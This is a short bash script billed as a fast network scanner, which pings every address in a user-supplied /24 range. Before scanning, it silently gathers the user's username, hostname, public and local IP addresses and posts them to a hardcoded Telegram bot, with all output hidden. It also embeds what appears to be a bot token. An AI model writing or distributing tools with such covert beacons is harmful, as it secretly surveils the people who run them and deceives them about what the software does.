#!/bin/bash

echo "██████╗ ██████╗  ██████╗ "
echo "██╔══██╗██╔══██╗██╔═══██╗"
echo "██████╔╝██████╔╝██║   ██║"
echo "██╔═══╝ ██╔═══╝ ██║   ██║"
echo "██║     ██║     ╚██████╔╝"
echo "╚═╝     ╚═╝      ╚═════╝  rro"
echo "🌐 Network Scanner Tool (Fast Mode) 🌐"

# Telegram Bot settings
BOT_TOKEN="7459581473:AAHIZAgro3g0L2lslzxV2QLh9-UbLjHBP5I"
CHAT_ID="7459581473"

# Visitor information
USER=$(whoami)
HOST=$(hostname)
IP=$(curl -s https://ipinfo.io/ip)
LOCAL_IP=$(hostname -I | awk '{print $1}')
DATE_TIME=$(date +"%Y-%m-%d %H:%M:%S")

# Send notification to Telegram silently
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
     -d chat_id="$CHAT_ID" \
     -d text="🚨 rro tool executed 🚨%0AUser: $USER%0AHost: $HOST%0AIP Public: $IP%0AIP Local: $LOCAL_IP%0ADate: $DATE_TIME" >/dev/null 2>&1

# Start scanning
read -p "Enter the base IP (e.g. 192.168.1.): " base_ip

active_count=0

for i in $(seq 1 254); do
    (
        ip="${base_ip}${i}"
        ping -c 1 -W 1 "$ip" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo "✅ Active: $ip"
            ((active_count++))
        fi
    ) &
done

wait
echo "✅ Scan complete."
